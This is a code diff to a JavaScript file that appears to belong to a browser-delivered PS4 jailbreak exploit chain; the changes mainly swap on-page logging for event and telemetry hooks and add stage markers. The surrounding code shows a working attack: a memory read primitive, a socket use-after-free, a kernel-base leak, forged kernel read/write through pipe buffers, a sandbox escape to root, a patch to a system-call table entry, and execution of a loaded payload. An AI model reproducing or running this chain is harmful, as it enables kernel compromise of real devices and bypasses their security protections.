@@ -5,23 +5,14 @@ import { establishPrimitive } from "./core.js?v=10";
 import { installWindowP, pairStatus } from "./mem.js";
 import { int64 } from "./int64.js";
 import { offsetsFor } from "./ps4_offsets.js";
+import { emit, EV } from "./events.js";
+import { installTelemetry } from "./telemetry.js";
 
-const outEl = document.getElementById("out");
-const stateEl = document.getElementById("state");
-const lines = [];
+installTelemetry({ prefix: "PS4-S10" });
+
 let passCount = 0, failCount = 0;
 const params = new URLSearchParams(location.search);
 const STOP_BEFORE_DOUBLE = params.get("stop") === "beforedouble";
-
-function post(tag, detail) {
-    try {
-        const x = new XMLHttpRequest();
-        x.open("POST", "t", true);
-        x.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-        x.send("PS4-S10&tag=" + encodeURIComponent(tag)
-             + "&detail=" + encodeURIComponent(String(detail == null ? "" : detail)));
-    } catch (e) { }
-}
 
 const VERBOSE = params.get("verbose") === "1";
 const PROSE = [
@@ -42,29 +33,39 @@ function terse(s) {
     if (s.length > 140) s = s.slice(0, 140) + "...";
     return s;
 }
+function post(tag, detail) { emit(EV.TELEMETRY, { tag: tag, detail: detail }); }
 function mark(tag, detail) {
-
     const raw = detail;
     detail = terse(detail);
-    lines.push(tag + (detail == null || detail === "" ? "" : "  " + detail));
-    const esc = t => String(t).replace(/&/g, "&amp;").replace(/</g, "&lt;");
-    outEl.innerHTML = lines.map(function (l) {
-        l = esc(l);
-        const c = /FAIL|ERROR|THREW|REBOOT|MISS|LOST|POISON|TIMEOUT|MISMATCH|ABORTED/i.test(l) ? "bad"
-                : /WARN|SKIP|REFUSED|COMMITTED|DIRTY/i.test(l) ? "warn"
-                : /\bOK\b|PASS|ACHIEVED|RUNNING|ARMED/i.test(l) ? "ok" : "";
-        return c ? '<span class="' + c + '">' + l + "</span>" : l;
-    }).join("\n");
-    outEl.scrollTop = outEl.scrollHeight;
+    emit(EV.LOG, { tag: tag, detail: detail, level: "info" });
     post(tag, raw);
 }
 
 function trace(tag, detail) { if (VERBOSE) mark(tag, detail); else post(tag, detail); }
-function state(t, c) { stateEl.textContent = t; stateEl.className = c || ""; }
+function state(t, c) { emit(EV.STATUS, { text: t, cls: c || "" }); }
 function check(name, ok, detail) {
-    if (ok) { passCount++; mark("PROOF-OK", name + (detail ? "  " + detail : "")); }
-    else { failCount++; mark("PROOF-FAIL", name + (detail ? "  " + detail : "")); }
+    if (ok) {
+        passCount++;
+        mark("PROOF-OK", name + (detail ? "  " + detail : ""));
+    } else {
+        failCount++;
+        mark("PROOF-FAIL", name + (detail ? "  " + detail : ""));
+        emit(EV.ERROR, { tag: "PROOF-FAIL", name: name, detail: detail || "" });
+    }
+    emit(EV.PROGRESS, { pass: passCount, fail: failCount });
     return ok;
+}
+
+const stageSuccessSeen = {};
+function stageStart(stage, name) {
+    emit(EV.STAGE_START, { stage: stage, name: name,
+        pass: passCount, fail: failCount });
+}
+function stageSuccess(stage, name, detail) {
+    if (stageSuccessSeen[stage]) return;
+    stageSuccessSeen[stage] = true;
+    emit(EV.STAGE_SUCCESS, { stage: stage, name: name,
+        pass: passCount, fail: failCount, detail: detail || "" });
 }
 function hx(n) { return "0x" + (n >>> 0).toString(16); }
 
@@ -134,6 +135,7 @@ let allDone = false;
         mark("FW", key || "(not a PS4 UA)");
         if (!off) { state("no offsets for this firmware", "bad"); return; }
         mark("FW-STATUS", off.fw_status || "none");
+        emit(EV.INIT, { fw: key, bug: "poops", fwStatus: off.fw_status || "none" });
         mark("PLAN", "iov_workers=" + NUM_IOV_WORKER + " attempts=" + NUM_ATTEMPT
             + " spray=" + NUM_IOV_SPRAY
             + " mode=" + (STOP_BEFORE_DOUBLE ? "stop-before-double" : "armed"));
@@ -172,6 +174,7 @@ let allDone = false;
               + (payload[0] === 0xe9 ? "e9-jmp-rel32" : "NOT-e9")
             : "MISSING");
 
+        stageStart(1, "primitive");
         state("running the primitive...", "warn");
         await new Promise(r => setTimeout(r, 0));
 
@@ -248,6 +251,8 @@ let allDone = false;
                 + " cycles=" + SWEEP_CYCLES);
         }
         mark("PRIMITIVE-OK", "");
+        stageSuccess(1, "primitive", "window.p");
+        stageStart(2, "setup");
 
         const cell = p.leakval(Math.expm1);
         const nativeFn = p.read8(p.read8(cell.add32(0x18))
@@ -559,7 +564,7 @@ let allDone = false;
                 + (i < NUM_IOV_WORKER ? i : i - NUM_IOV_WORKER);
             const w = { name: name, armed: false, wired: false };
             workers.push(w);
-            w.worker = new Worker("rpc_worker.js");
+            w.worker = new Worker("js/engine/rpc_worker.js");
             w.rpc = makeRpc(w.worker, name);
             if ((await w.rpc("ping", 15000)) !== "pong")
                 throw new Error(name + " did not answer ping");
@@ -598,6 +603,8 @@ let allDone = false;
         const uioWorkers = workers.slice(NUM_IOV_WORKER);
         mark("WORKER-POOLS", "iov=" + iovWorkers.length
             + " uio=" + uioWorkers.length);
+        stageSuccess(2, "setup", "workers=" + workers.length);
+        stageStart(3, "uaf-arm");
 
         const prioAb = new ArrayBuffer(8), maskAb = new ArrayBuffer(0x10);
         keepAlive.push(prioAb, maskAb);
@@ -846,6 +853,7 @@ let allDone = false;
             const clr = netevent(uafSock, NETEVENT_CLEAR_QUEUE);
             mark("UAF-ARMED", "fd=" + uafSock + " clear_rv=" + clr.rv);
             committed = true;
+            stageSuccess(3, "uaf-arm", "fd=" + uafSock);
 
             try { if (boot) localStorage.setItem("ps4lab_committed_boot", boot); }
             catch (e) { }
@@ -984,6 +992,7 @@ let allDone = false;
             if (off.k_kl_lock === undefined || off.k_kl_lock === 0) {
                 mark("KQUEUE-SKIPPED", "reason=no-k_kl_lock");
             } else {
+                stageStart(4, "kqueue-leak");
                 state("leaking a kqueue...", "warn");
 
                 freeRthdr(triplets[2]);
@@ -1041,6 +1050,8 @@ let allDone = false;
                     mark("KQUEUE-LEAK", "kl_lock=" + klLock + " kq_fdp=" + kqFdp);
                     mark("KERNEL-BASE", kernelBase + " = kl_lock-0x"
                         + off.k_kl_lock.toString(16));
+                    stageSuccess(4, "kqueue-leak", "kl_lock");
+                    stageStart(5, "kread");
 
                     try {
                         const kbNow = "" + kernelBase;
@@ -1504,6 +1515,8 @@ let allDone = false;
                 && kptr(mData) && kptr(sData), "")) {
                 mark("MAKE-KARW-ABORTED", "reason=walk-not-kernel-pointers");
             } else {
+                stageSuccess(5, "kread", "ofiles-walk");
+                stageStart(6, "make-karw");
 
                 const pbAb = new ArrayBuffer(PIPEBUF_SIZEOF);
                 keepAlive.push(pbAb);
@@ -1571,6 +1584,8 @@ let allDone = false;
                         + " slave=" + fpS2 + " kread=" + sFp);
                     const kvAgree = check("primitives-agree-pipes-struct-file",
                         same(fpM2, mFp) && same(fpS2, sFp), "");
+                    if (kvElfOk && kvAgree)
+                        stageSuccess(6, "make-karw", "pipe-primitive");
                     if (!kvElfOk || !kvAgree) {
                         // REPORT ONLY. Do NOT null kv and do NOT skip what
                         // follows. By this point the pipebuf forge has already
@@ -1684,6 +1699,7 @@ let allDone = false;
                         const CR_NGROUPS = 0x10, CR_RGID = 0x14;
                         const CR_PRISON = 0x30, CR_SCECAPS1 = 0x60, CR_SCECAPS0 = 0x68;
                         const FD_RDIR = 0x10, FD_JDIR = 0x18;
+                        stageStart(7, "sandbox-escape");
                         state("sandbox escape...", "warn");
                         {
                             if (sc(SYS.pipe, argAddr).i32 !== -1) {
@@ -1746,8 +1762,9 @@ let allDone = false;
                                 mark("JAILBROKEN", "uid=" + uidNow
                                     + " prison0=" + kview(ucred).getBInt(CR_PRISON)
                                     + " fd_rdir=" + kview(procFd).getBInt(FD_RDIR));
-                                check("kernel-reports-root",
-                                    jailbroken, "getuid=" + uidNow);
+                                if (check("kernel-reports-root",
+                                    jailbroken, "getuid=" + uidNow))
+                                    stageSuccess(7, "sandbox-escape", "uid=0");
                             }
                         }
                     } catch (e) {
@@ -1823,6 +1840,7 @@ let allDone = false;
                         if (burned.size) rebootRequired = true;
                     }
 
+                    stageStart(8, "remove-uaf-file");
                     state("remove_uaf_file...", "warn");
                     const uafFp = fget(uafSock);
                     uafFpSaved = uafFp;
@@ -2119,7 +2137,10 @@ let allDone = false;
                         check("alias-freed-file-nulled",
                             nulled > 0, "nulled=" + nulled);
                         const clean = nulled > 0 && zoneClean;
-                        if (clean) rebootRequired = false;
+                        if (clean) {
+                            rebootRequired = false;
+                            stageSuccess(8, "remove-uaf-file", "zones-clean");
+                        }
                         else mark("STILL-DIRTY", "reboot=1 fdtable="
                             + (nulled > 0 ? "ok" : "FAILED")
                             + " zone=" + (zoneClean ? "ok" : "FAILED"));
@@ -2148,6 +2169,7 @@ let allDone = false;
 
                     let kpatched = false;
                     if (jailbroken && kpatch && KPATCH_JMP_SITES.length >= 4) {
+                        stageStart(9, "kernel-patches");
                         state("kernel patches...", "warn");
                         const SYSENT_NARG = 0, SYSENT_CALL = 8, SYSENT_THRCNT = 0x2c;
                         const sysent = kernelBase.add32(off.k_sysent_661);
@@ -2206,6 +2228,8 @@ let allDone = false;
                                     const armedOk = same(kview(sysent).getBInt(SYSENT_CALL), gadget);
                                     mark("SYSENT-ARMED", "sy_call=" + gadget
                                         + (armedOk ? "" : " MISMATCH"));
+                                    if (armedOk)
+                                        stageSuccess(9, "kernel-patches", "sysent-661");
                                     if (armedOk) {
                                         // ITEM 5b. sysent[661] is now pointing at
                                         // a jmp [rsi] gadget SYSTEM-WIDE. If
@@ -2260,6 +2284,7 @@ let allDone = false;
                     let payloadRunning = false;
                     if (payload && (kpatched || params.get("payload") === "1")
                         && params.get("payload") !== "0") {
+                        stageStart(10, "payload");
                         state("payload...", "warn");
                         const sz = (payload.length + 0x3fff) & ~0x3fff;
                         const m = sc(SYS.mmap, 0, sz, 7, 0x1002, -1, 0);
@@ -2296,8 +2321,11 @@ let allDone = false;
                                         + " handle=" + handle);
                                     check("payload-thread-created",
                                         payloadRunning, "");
-                                    if (payloadRunning) mark("PAYLOAD-RUNNING",
-                                        "bytes=" + payload.length + " entry=" + entry);
+                                    if (payloadRunning) {
+                                        mark("PAYLOAD-RUNNING",
+                                            "bytes=" + payload.length + " entry=" + entry);
+                                        stageSuccess(10, "payload", "pthread=" + rc);
+                                    }
                                 }
                             }
                         }
@@ -2482,6 +2510,13 @@ let allDone = false;
 
         if (rebootRequired)
             mark("REBOOT-REQUIRED", "reason=uaf-file-not-reclaimed");
+        if (allDone || !committed)
+            emit(EV.SAFE_TO_EXIT, { summary: allDone ? "payload-running" : "no-commit",
+                pass: passCount, fail: failCount });
+        else
+            emit(EV.REBOOT_REQUIRED, { reason: rebootRequired ? "uaf-file-not-reclaimed"
+                : "committed-kernel-state", committed: committed,
+                pass: passCount, fail: failCount });
         mark("PROOF-SUMMARY-FINAL", "pass=" + passCount + " fail=" + failCount);
     }
 })();
